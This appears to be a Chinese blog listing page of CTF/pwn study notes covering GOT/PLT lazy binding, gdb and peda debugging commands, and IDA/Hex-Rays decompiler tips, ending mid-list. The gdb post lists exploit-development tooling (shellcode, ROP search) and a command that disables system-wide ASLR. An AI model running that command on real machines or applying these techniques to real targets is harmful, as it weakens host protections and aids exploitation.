<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="google-site-verification" content="googleaf0347feb5ea0936.html" />














  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />






  <link rel="alternate" href="/atom.xml" title="上善若水" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />






<meta name="description" content="Try your best!">
<meta property="og:type" content="website">
<meta property="og:title" content="上善若水">
<meta property="og:url" content="http://yoursite.com/page/10/index.html">
<meta property="og:site_name" content="上善若水">
<meta property="og:description" content="Try your best!">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="上善若水">
<meta name="twitter:description" content="Try your best!">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.2',
    sidebar: {"position":"right","display":"post","offset":12,"offset_float":12,"b2t":true,"scrollpercent":false,"onmobile":true},
    fancybox: true,
    tabs: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/10/"/>





  <title>上善若水 - 古之立大事者，不惟有超世之才，亦必有坚韧不拔之志！</title>
  





  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?663212c5ef558c27e77385b620f14823";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->




</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-right 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">上善若水</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">古之立大事者，不惟有超世之才，亦必有坚韧不拔之志！</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
            
            站点地图
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/03/got、plt表介绍/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/08/03/got、plt表介绍/" itemprop="url">got、plt表介绍</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-03T22:31:33+08:00">
                2017-08-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="1-GOT表和PLT表"><a href="#1-GOT表和PLT表" class="headerlink" title="1. GOT表和PLT表"></a>1. GOT表和PLT表</h3><p>GOT（Global Offset Table，全局偏移表）是Linux ELF文件中用于定位全局变量和函数的一个表。PLT（Procedure Linkage Table，过程链接表）是Linux ELF文件中用于延迟绑定的表，即函数第一次被调用的时候才进行绑定。</p>
<h3 id="2-延迟绑定"><a href="#2-延迟绑定" class="headerlink" title="2. 延迟绑定"></a>2. 延迟绑定</h3><p>所谓延迟绑定，就是当函数第一次被调用的时候才进行绑定（包括符号查找、重定位等），如果函数从来没有用到过就不进行绑定。基于延迟绑定可以大大加快程序的启动速度，特别有利于一些引用了大量函数的程序</p>
<h3 id="3-延迟绑定的基本原理"><a href="#3-延迟绑定的基本原理" class="headerlink" title="3. 延迟绑定的基本原理"></a>3. 延迟绑定的基本原理</h3><p>假如存在一个bar函数，这个函数在PLT中的条目为bar@plt，在GOT中的条目为bar@got，那么在第一次调用bar函数的时候，首先会跳转到PLT，伪代码如下：</p>
<p>bar@plt:</p>
<p>jmp bar@got</p>
<p>patch bar@got</p>
<p>这里会从PLT跳转到GOT，如果函数从来没有调用过，那么这时候GOT会跳转回PLT并调用patch bar@got，这一行代码的作用是将bar函数真正的地址填充到bar@got，然后跳转到bar函数真正的地址执行代码。当我们下次再调用bar函数的时候，执行路径就是先后跳转到bar@plt、bar@got、bar真正的地址。具体来看个实例：</p>
<p>vulnerable_function函数调用了read函数，由于read函数是动态链接加载进来的只有在链接的时候才知道地址，编译时并不知道地址</p>
<p><img src="/images/2017-08-03/1.png" alt="1"></p>
<p>执行call _read函数会跳到plt表中寻找中：</p>
<p><img src="/images/2017-08-03/2.png" alt="2"></p>
<p>plt表中会继续跳入到got表中寻找</p>
<p><img src="/images/2017-08-03/3.png" alt="3"></p>
<p>got表中的所存的read函数的地址便是在pwn6进程中的实际地址，也就是</p>
<p><img src="/images/2017-08-03/4.png" alt="4"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/03/gdb的调试与使用/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/08/03/gdb的调试与使用/" itemprop="url">gdb的调试与使用</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-03T22:22:50+08:00">
                2017-08-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="1-调试的快捷键"><a href="#1-调试的快捷键" class="headerlink" title="1. 调试的快捷键"></a>1. 调试的快捷键</h3><font color="#f00">peda带有的功能，直接输入命令，其就会给予提示（如果不是这样，基本上也是该命令就可以不带参数）。这儿就不多做介绍</font>

<h4 id="1-1-基础的调试快捷键"><a href="#1-1-基础的调试快捷键" class="headerlink" title="1.1 基础的调试快捷键"></a>1.1 基础的调试快捷键</h4><ul>
<li>s step，si步入</li>
<li>n 执行下一条指令  ni步入</li>
<li>b 在某处下断点，可以用 <ul>
<li>b * adrress</li>
<li>b function_name</li>
<li>info b  查看断点信息</li>
<li>delete 1删除第一个断点</li>
</ul>
</li>
<li>c 继续</li>
<li>r 执行</li>
<li>disas addr 查看addr处前后的反汇编代码</li>
</ul>
<h4 id="1-2-显示数据"><a href="#1-2-显示数据" class="headerlink" title="1.2 显示数据"></a>1.2 显示数据</h4><ul>
<li>p 系列<ul>
<li>p system/main  显示某个函数地址<ul>
<li>p $esp    显示寄存器</li>
</ul>
</li>
<li>p/x  p/a p/b p/s。。。</li>
<li>p 0xff - 0xea   <font color="#f00">计算器</font></li>
<li>print &amp;VarName 查看变量地址</li>
<li>p * 0xffffebac   查看某个地址处的值</li>
</ul>
</li>
<li>x系列<ul>
<li>x/xw addr 显示某个地址处开始的16进制内容，如果有符号表会加载符号表</li>
<li>x/x $esp 查看esp寄存器中的值</li>
<li>x/s addr 查看addr处的字符串</li>
<li>x/b addr 查看addr处的字符</li>
<li>x/i  addr 查看addr处的反汇编结果</li>
</ul>
</li>
<li>info系列<ul>
<li>info register $ebp  查看寄存器ebp中的内容 (简写为 i r ebp)</li>
<li>i r eflags 查看状态寄存器</li>
<li>i r ss        查看段寄存器</li>
<li>i b            查看断点信息</li>
<li>i functions  查看所有的函数</li>
</ul>
</li>
<li>disas addr 查看addr处前后的反汇编代码</li>
<li>stack 20   查看栈内20个值</li>
<li>show args  查看参数</li>
<li>vmmap 查看映射状况 <font color="#f00">peda带有</font></li>
<li>readelf 查看elf文件中各个段的起始地址  <font color="#f00">peda带有</font></li>
<li>parseheap 显示堆状况  <font color="#f00">peda带有</font></li>
</ul>
<h4 id="1-3-查找数据"><a href="#1-3-查找数据" class="headerlink" title="1.3 查找数据"></a>1.3 查找数据</h4><ul>
<li>find 查找字符串    <font color="#f00">peda带有</font></li>
<li>searchmem 查找字符串  <font color="#f00">peda带有</font></li>
<li>ropsearch &quot;xor eax,eax;ret&quot;  0x08048080 0x08050000   查找某段的rop  <font color="#f00">peda带有</font></li>
<li>ropgadget  提供多个pop|ret可行结果  <font color="#f00">peda带有</font></li>
</ul>
<h4 id="1-4-修改数据"><a href="#1-4-修改数据" class="headerlink" title="1.4 修改数据"></a>1.4 修改数据</h4><ul>
<li>set $esp=0x110  修改寄存器的值</li>
<li>set *0xf7ff3234=0x08042334 修改内存的值</li>
<li>set args &quot;asdasg&quot; &quot;afdasgasg&quot; &quot;agasdsa&quot;  分别给参数1,2,3赋值</li>
<li>set args &quot;`python -c &#39;print &quot;1234\x7f\xde&quot;&#39;`&quot;    这个参数中用python脚本重写了一下，避免有些字符无法正确设置</li>
<li>r &quot;arg1&quot; &quot;arg2&quot; &quot;arg3&quot;   设置参数</li>
<li>run `$(perl -e &#39;print &quot;A&quot;x20&#39;)`</li>
</ul>
<h4 id="1-1-peda插件"><a href="#1-1-peda插件" class="headerlink" title="1.1 peda插件"></a>1.1 peda插件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">Enhance the display of gdb: colorize and display disassembly codes, registers, memory information during debugging.</div><div class="line">Add commands to support debugging and exploit development (for a full list of commands use peda help):</div><div class="line">aslr -- Show/set ASLR setting of GDB</div><div class="line">checksec -- Check for various security options of binary</div><div class="line">dumpargs -- Display arguments passed to a function when stopped at a call instruction</div><div class="line">dumprop -- Dump all ROP gadgets in specific memory range</div><div class="line">elfheader -- Get headers information from debugged ELF file</div><div class="line">elfsymbol -- Get non-debugging symbol information from an ELF file</div><div class="line">lookup -- Search for all addresses/references to addresses which belong to a memory range</div><div class="line">patch -- Patch memory start at an address with string/hexstring/int</div><div class="line">pattern -- Generate, search, or write a cyclic pattern to memory</div><div class="line">procinfo -- Display various info from /proc/pid/</div><div class="line">pshow -- Show various PEDA options and other settings</div><div class="line">pset -- Set various PEDA options and other settings</div><div class="line">readelf -- Get headers information from an ELF file</div><div class="line">ropgadget -- Get common ROP gadgets of binary or library</div><div class="line">ropsearch -- Search for ROP gadgets in memory</div><div class="line">searchmem|find -- Search for a pattern in memory; support regex search</div><div class="line">shellcode -- Generate or download common shellcodes.</div><div class="line">skeleton -- Generate python exploit code template</div><div class="line">vmmap -- Get virtual mapping address ranges of section(s) in debugged process</div><div class="line">xormem -- XOR a memory region with a key</div><div class="line">Installation</div></pre></td></tr></table></figure>
<p><strong>vmmap：查看当前程序映射的内存块</strong><br><strong>dumprop：</strong></p>
<h3 id="2-查找某个plt、got、plt-2"><a href="#2-查找某个plt、got、plt-2" class="headerlink" title="2. 查找某个plt、got、plt_2"></a>2. 查找某个plt、got、plt_2</h3><ul>
<li>plt 可以直接使用pwntools中的ELF(elf).symbols(function_name)</li>
<li>got 可以直接使用pwntools中的ELF(elf).got(function_name)</li>
<li>plt_2 可以直接使用pwntools中的ELF(lib).symbols(function_name)</li>
</ul>
<h3 id="3-查找程序所动态链接的库"><a href="#3-查找程序所动态链接的库" class="headerlink" title="3. 查找程序所动态链接的库"></a>3. 查找程序所动态链接的库</h3><ul>
<li><p>file pwn3</p>
<ul>
<li>pwn3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=916959406d0c545f6971223c8e06bff1ed9ae74d, not stripped</li>
</ul>
</li>
<li><p>checksec pwn3</p>
<ul>
<li>[*] &#39;/root/Desktop/Pwnable/fmt/normal/fmt_string_write_got/pwn3&#39;<br>Arch:     i386-32-little<br>RELRO:    Partial RELRO<br>Stack:    No canary found<br>NX:       NX enabled<br>PIE:      No PIE (0x8048000)</li>
</ul>
</li>
</ul>
<ul>
<li>ldd pwn3<ul>
<li>linux-gate.so.1 (0xf77ad000)<br>libc.so.6 =&gt; /lib32/libc.so.6 (0xf75d2000)<br>/lib/ld-linux.so.2 (0x56601000)</li>
</ul>
</li>
</ul>
<h3 id="4-编译32位可执行文件"><a href="#4-编译32位可执行文件" class="headerlink" title="4. 编译32位可执行文件"></a>4. 编译32位可执行文件</h3><ul>
<li><p>gcc -m32 test.c -o test</p>
<ul>
<li>一般而言此时的目标文件为32位，且不能生成调试信息</li>
</ul>
</li>
<li><p>gcc -m32 -g test.c -o test</p>
<ul>
<li><p>生成的目标文件是32位，且可以利用操作系统的“原生格式（native format）”生成调试</p>
<p>信息。GDB 可以直接利用这个信息，其它调试器也可以使用这个调试信息</p>
</li>
</ul>
</li>
<li><p>其它保护状态的开启，请参考<a href="/2017/09/30/linux程序的常用保护机制/"><em>linux程序的常用保护机制</em></a></p>
</li>
</ul>
<h3 id="5-开启PIE之后的调试"><a href="#5-开启PIE之后的调试" class="headerlink" title="5. 开启PIE之后的调试"></a>5. 开启PIE之后的调试</h3><p>开启PIE之后，地址会一直在变，这十分不利于gdb的调试，所以这时候应该在本地关闭ASLR</p>
<p>常用的方法是：echo 0 &gt; /proc/sys/kernel/randomize_va_space</p>
<p>开启的方式是：echo 2 &gt; /proc/sys/kernel/randomize_va_space</p>
<h3 id="6-运行时查看文件执行"><a href="#6-运行时查看文件执行" class="headerlink" title="6. 运行时查看文件执行"></a>6. 运行时查看文件执行</h3><p>做了一道题，在你不执行的时候，只能找到相对地址，但是下断点需要实际的执行地址。若关闭PIE，那么每次的执行地址将会一致，这个时候就需要找到执行的开始地址。peda的常用指令中有vmmap，可以找到实际地址。</p>
<p>这道题很让人苦恼的是，如果gdb中执行run，那么将陷入循环而不能使用vmmap，若强制结束，最后vmmap会报错。这个时候，就有另外的一些办法：</p>
<ul>
<li>执行./pwn &amp;，这个时候会将pwn程序放入后台，而且你能快速知道这个程序的PID，这个时候cat /proc/pwn的PID/maps，就能找到对应的执行时地址。之后kill -9 pwn的PID</li>
<li>编写一个小脚本，任意放置一个断点，并开启gdb调试，这个时候断点会崩溃，但是gdb-peda中使用vmmap仍能找到对应地址</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/03/XMAN之旅-逆向基础（下）/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/08/03/XMAN之旅-逆向基础（下）/" itemprop="url">XMAN之旅_逆向基础（下）</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-03T00:07:08+08:00">
                2017-08-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/xman/" itemprop="url" rel="index">
                    <span itemprop="name">xman</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="三、-CTF逆向与现实逆向"><a href="#三、-CTF逆向与现实逆向" class="headerlink" title="三、 CTF逆向与现实逆向"></a>三、 CTF逆向与现实逆向</h3><ul>
<li><p>CTF逆向特点</p>
<ul>
<li>代码量小</li>
<li>结构简单<ul>
<li>单文件</li>
</ul>
</li>
<li>编码单一</li>
<li>现代语言特性少<ul>
<li>面向过程</li>
</ul>
</li>
<li>加密壳/优化少</li>
<li>语言常见<ul>
<li>C/C++/ASM</li>
</ul>
</li>
</ul>
</li>
<li><p>现实逆向</p>
<ul>
<li>代码量巨大</li>
<li>结构复杂<ul>
<li>大量静态库、动态库</li>
</ul>
</li>
<li>各种乱码</li>
<li>大量现代语言特性<ul>
<li>OO、Template</li>
</ul>
</li>
<li>优化和加密壳十分常见</li>
<li>语言可能十分神器<ul>
<li>Go/VB/Delphi</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="四、IDA高级使用"><a href="#四、IDA高级使用" class="headerlink" title="四、IDA高级使用"></a>四、IDA高级使用</h3><h4 id="1-设置字符串编码和格式"><a href="#1-设置字符串编码和格式" class="headerlink" title="1. 设置字符串编码和格式"></a>1. 设置字符串编码和格式</h4><ul>
<li>快捷键：<font color="#f00">Alt+A</font></li>
<li>可以设置字符串类型<ul>
<li>Unicode字符串 （WCS）</li>
<li>多字节字符串 （MBS）</li>
<li>其他</li>
</ul>
</li>
<li>可以设置字符串编码<ul>
<li>需要系统支持相应的编码</li>
</ul>
</li>
</ul>
<h4 id="2-导入-导出数据"><a href="#2-导入-导出数据" class="headerlink" title="2. 导入/导出数据"></a>2. 导入/导出数据</h4><ul>
<li>快捷键：<font color="#f00">Shift+E</font></li>
<li>菜单名：<ul>
<li>Edit -&gt; Import Data</li>
<li>Edit -&gt; Export Data</li>
</ul>
</li>
<li>操作：<ul>
<li>选定后按快捷键</li>
</ul>
</li>
<li>方便提取数据或修改idb数据库</li>
</ul>
<h4 id="3-选定大段数据"><a href="#3-选定大段数据" class="headerlink" title="3. 选定大段数据"></a>3. 选定大段数据</h4><ul>
<li>快捷键： <font color="#f00">Alt+L</font></li>
<li><ul>
<li>菜单名：<ul>
<li>Edit -&gt; Begin Selection</li>
</ul>
</li>
</ul>
</li>
<li>将标定选择起始点</li>
<li>滚轮或按g跳转至结束位置</li>
</ul>
<h4 id="4-批量应用类型"><a href="#4-批量应用类型" class="headerlink" title="4. 批量应用类型"></a>4. 批量应用类型</h4><ul>
<li>操作<ul>
<li>设置好第一个类型</li>
<li>利用选定大量数据的方法选定数据</li>
<li>按*或按d弹出建立数组对话框</li>
<li><font color="#f0f">不勾选Create as array</font>

</li>
</ul>
</li>
</ul>
<h4 id="5-设置间接跳转地址"><a href="#5-设置间接跳转地址" class="headerlink" title="5. 设置间接跳转地址"></a>5. 设置间接跳转地址</h4><ul>
<li>快捷键：<font color="#f00">Alt+F11</font></li>
<li>菜单名：<ul>
<li>Edit -&gt; Plugins -&gt; Change the callee address </li>
</ul>
</li>
<li>将利用动态调试获取到的调用/跳转地址填入，可以极大地帮助IDA和F5的分析（不如参数个数、调用约定等），获得更准确的结果</li>
</ul>
<h4 id="6-修复跳转表"><a href="#6-修复跳转表" class="headerlink" title="6. 修复跳转表"></a>6. 修复跳转表</h4><ul>
<li>默认无快捷键，可手动设置</li>
<li>菜单<ul>
<li>Edit -&gt; Other -&gt; Specify switch idiom</li>
</ul>
</li>
<li>当程序在PIE时可能会导致<font color="#f00">跳转表分析失败</font>，于是需要手动修复来获得更好的分析结果</li>
</ul>
<h4 id="7-IDAPython"><a href="#7-IDAPython" class="headerlink" title="7. IDAPython"></a>7. IDAPython</h4><ul>
<li>IDA自带支持的脚本</li>
<li>可以使用几乎所有IDA提供的API</li>
<li>可以快速完成大量重复性操作</li>
<li>可以方便的了解IDA内部的数据和结构</li>
</ul>
<h3 id="五、IDA-F5出错处理"><a href="#五、IDA-F5出错处理" class="headerlink" title="五、IDA F5出错处理"></a>五、IDA F5出错处理</h3><h4 id="1-positive-sp-value"><a href="#1-positive-sp-value" class="headerlink" title="1. positive sp value"></a>1. positive sp value</h4><ul>
<li>成因：IDA会自动分析SP寄存器的变化量，由于缺少调用约定、参数个数等信息，导致分析出错</li>
<li>解决方案<ul>
<li>推荐：在<font color="#f00">Option -&gt; General设置显示Stack pointer</font>，然后去检查对应地址附近调用的函数的调用约定以及栈指针变化</li>
<li>不推荐： 在对应地址处按<font color="#f00">Alt+K</font>，然后输入一个较大的负值（有风险）</li>
</ul>
</li>
</ul>
<h4 id="2-call-analysis-failed"><a href="#2-call-analysis-failed" class="headerlink" title="2. call analysis failed"></a>2. call analysis failed</h4><ul>
<li>成因：F5在分析调用时，未能成功解析<font color="#f00">参数位置/参数个苏</font></li>
<li>解决方案：<ul>
<li>对于间接调用（类似call eax等），可使用之前讲过的<font color="#f0f">设置调用地址</font>的方法解决</li>
<li>对于直接调用，查看<font color="#f0f">调用目标的type</font>是否正确设置。<font color="#f0f">可变参数</font>是引发这种错误的主要原因之一</li>
</ul>
</li>
</ul>
<h4 id="3-cannot-convert-to-microcode"><a href="#3-cannot-convert-to-microcode" class="headerlink" title="3. cannot convert to microcode"></a>3. cannot convert to microcode</h4><ul>
<li>成因：部分指令无法被编译</li>
<li>解决方案：<ul>
<li>最常见起因是函数中<font color="#f0f">有未设置成指令的数据字节</font>，按c将其设置为指令即可</li>
<li>其次常见的是<font color="#f0f">x86中的rep前缀</font>，比如<font color="#f0f">repxx  jmp</font>等。可以将该指令的<font color="#f0f">第一个字节(repxx前缀的对应位置)patch为0x90 (NOP)</font></li>
</ul>
</li>
</ul>
<h4 id="4-stack-frame-is-too-big"><a href="#4-stack-frame-is-too-big" class="headerlink" title="4. stack frame is too big"></a>4. stack frame is too big</h4><ul>
<li>成因：在分析栈帧时，IDA出现异常，导致分析出错</li>
<li>解决方案：<ul>
<li>找到明显不合常理的stack variable offset，双击进入栈帧界面，<font color="#f0f">按u键删除对应的stack variable</font></li>
<li>如果是去壳导致的原因，先用OD等软件脱壳</li>
<li>可能由花指令导致，请手动或自动检查并去除花指令</li>
</ul>
</li>
<li>非常罕见</li>
</ul>
<h4 id="5-local-variable-allocation-failed"><a href="#5-local-variable-allocation-failed" class="headerlink" title="5. local variable allocation failed"></a>5. local variable allocation failed</h4><ul>
<li>成因： 分析函数时，有部分变量对应的区域<font color="#f0f">发生重叠</font>，多见于ARM平台出现Point、Rect等8字节、16字节、32字节结构</li>
<li>解决方案<ul>
<li>修改对应参数为多个int</li>
<li>修改ida安装目录下hexrays.cfg中的HO_IGNORE_OVERLAPS</li>
</ul>
</li>
</ul>
<h4 id="6-F5结果不正确"><a href="#6-F5结果不正确" class="headerlink" title="6. F5结果不正确"></a>6. F5结果不正确</h4><ul>
<li>成因：F5会自动删除其认为不可能到达的死代码</li>
<li>常见起因是一个函数错误的标注为noretur函数</li>
<li>解决方案<ul>
<li>进到目前反编译结果，找到<font color="#f0f">最后被调用的函数(被错误分析的函数)，双击进入（迫使HexRays重新分析相应函数）</font></li>
<li>如果上述方案不成功，那么进到被错误分析的函数，按Tab切换到反汇编界面，按Alt+P进入界面取消函数的Does not return 属性</li>
</ul>
</li>
</ul>
<h3 id="六、IDA-F5高级使用"><a href="#六、IDA-F5高级使用" class="headerlink" title="六、IDA F5高级使用"></a>六、IDA F5高级使用</h3><h4 id="1-自定义寄存器传参"><a href="#1-自定义寄存器传参" class="headerlink" title="1. 自定义寄存器传参"></a>1. 自定义寄存器传参</h4><ul>
<li>使用IDA中的<strong>usercall和</strong>userpurge调用约定（两个下划线）</li>
<li>设置范例<ul>
<li>int __usercall test&lt;eax&gt; (int al &lt;ebx&gt;);</li>
<li>&lt;&gt;中为对应值的位置</li>
<li>第一个&lt;&gt;为返回值位置，注意返回值的位置即使不变也要填写</li>
</ul>
</li>
</ul>
<h4 id="2-HexRays源码级调试"><a href="#2-HexRays源码级调试" class="headerlink" title="2. HexRays源码级调试"></a>2. HexRays源码级调试</h4><ul>
<li>注意<ul>
<li>F5中显示的变量很可能不是变量原来的值，尤其是寄存器变量，尽量在  值位置断下并查看</li>
<li>对于优化后的代码，F5调试bug很多</li>
<li>F5单步不太稳定，在ARM平台可能会跑飞</li>
<li>F5的运行至指定位置功能功能不稳定</li>
</ul>
</li>
</ul>
<h4 id="3-恢复符号"><a href="#3-恢复符号" class="headerlink" title="3. 恢复符号"></a>3. 恢复符号</h4><ul>
<li>找到程序的旧版本<ul>
<li>大量程序早期版本中安全意识薄弱，没有删除符号等各种信息</li>
<li>苹果用户可以在AppAdmin中获取版本应用</li>
</ul>
